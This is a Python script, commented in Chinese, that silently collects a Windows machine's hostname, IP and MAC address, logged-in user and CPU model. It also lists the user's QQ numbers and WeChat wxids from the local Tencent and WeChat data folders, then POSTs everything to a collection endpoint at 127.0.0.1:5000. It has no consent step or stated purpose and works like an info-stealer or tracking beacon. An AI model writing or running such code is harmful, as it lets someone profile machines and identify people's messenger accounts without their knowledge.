import socket
from datetime import datetime
import subprocess
import hashlib

def calculate_md5(input_string):
    # 创建一个 md5 对象
    md5_hash = hashlib.md5()

    # 更新哈希对象以包含输入字符串的字节表示
    md5_hash.update(input_string.encode('utf-8'))

    # 获取十六进制表示的哈希值
    md5_result = md5_hash.hexdigest()

    return md5_result
# 获取当前时间
current_time = datetime.now()

# 格式化输出，具体到秒
formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")

hostname = socket.gethostname()
# print("计算机名称:", hostname)

import psutil
import socket

# 获取本机IP地址
def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# 获取本机MAC地址
def get_mac_address():
    try:
        import uuid
        mac = hex(uuid.getnode()).replace('0x', '').zfill(12)
        mac_address = ":".join([mac[e:e+2] for e in range(0, 12, 2)])
        return mac_address
    except:
        return "N/A"



ip_address = get_ip_address()
mac_address = get_mac_address()




import platform

system = platform.system()
release = platform.release()
version = platform.version()


import os

user = os.getlogin()
# print(f"当前登录用户: {user}")

# 探测QQ号
import os
QQnum = ''
# 指定目标文件夹路径
target_folder = rf'C:\Users\{user}\Documents\Tencent Files'
# 检查目标文件夹是否存在
if os.path.exists(target_folder):
    # 获取目标文件夹下的所有子文件夹
    subfolders = [f for f in os.listdir(target_folder) if os.path.isdir(os.path.join(target_folder, f))]
    
    if subfolders:
        # print("合法QQ号：")
        for folder in subfolders:
            try:
                if int(folder) > 10000:
                    # print(f"{folder}")
                    QQnum = QQnum+str(f"{folder};")
            except:
                print("错误")


# 探测wxid
import os
wxid = ''
# 指定目标文件夹路径
target_folder2 = fr'C:\Users\{user}\Documents\WeChat Files'
# 检查目标文件夹是否存在
if os.path.exists(target_folder2):
    # print("wx目录存在")
    # 获取目标文件夹下的所有子文件夹
    subfolders2 = [f for f in os.listdir(target_folder2) if os.path.isdir(os.path.join(target_folder2, f))]
    
    if subfolders2:
        # print("合法wxid：")
        for folder2 in subfolders2:
            print(folder2)
            try:
                if "wxid_" in folder2:

                    # print(f"合法{folder2}")
                    wxid = wxid+str(f"{folder2};")
            except:
                print("错误")
print("-------------------")
# 获取CPU型号
output = subprocess.check_output('wmic cpu get Name', shell=True)
lines = output.decode('utf-8').splitlines()
print(str(lines[2]))
CPUname=lines[2]
# print(QQnum)

# 计算机名称 IP地址 MAC地址 默认网关 当前登陆用户 QQ号 wxid
INFO = f'''{formatted_time},{hostname},{ip_address},{mac_address},{user},{CPUname},{QQnum},{wxid}'''
print(INFO)
INFO = INFO.encode('utf-8')
import requests
res = requests.post("http://127.0.0.1:5000/upload",data=INFO)
print(res.text)
